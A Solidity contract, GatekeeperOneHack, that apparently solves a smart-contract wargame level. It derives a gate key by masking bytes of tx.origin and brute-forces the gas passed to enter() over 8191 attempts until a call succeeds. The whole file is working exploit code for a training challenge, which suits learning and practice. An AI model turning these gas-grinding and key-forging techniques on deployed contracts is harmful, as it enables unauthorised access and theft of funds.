// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {IGatekeeperOne} from "src/hack/interfaces/IGatekeeperOne.sol";

contract GatekeeperOneHack {
    error HackFailed();

    function hack(address _gatekeeperOne) external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0x000000ff0000ffff;

        for (uint256 i; i <= 8191; ++i) {
            try
                IGatekeeperOne(_gatekeeperOne).enter{gas: i + (8191 * 10)}(
                    gateKey
                )
            {
                return;
            } catch {}
        }
        revert HackFailed();
    }
}
